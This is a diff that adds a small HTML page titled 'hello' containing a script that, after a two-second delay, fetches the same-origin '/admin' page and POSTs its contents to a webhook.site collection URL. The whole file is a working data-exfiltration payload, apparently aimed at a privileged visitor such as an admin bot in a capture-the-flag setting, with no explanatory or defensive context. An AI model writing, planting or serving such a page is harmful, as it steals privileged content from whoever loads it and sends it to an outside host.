@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>hello</title>
+</head>
+<body>
+<script>
+setTimeout(() => {
+  fetch('/admin')
+    .then(r => r.text())
+    .then(d => {
+      fetch('https://webhook.site/1934ed84-cc53-4f77-982b-e92121633697', {
+        method: 'POST',
+        body: d
+      });
+    });
+}, 2000);
+</script>
+</body>
+</html>
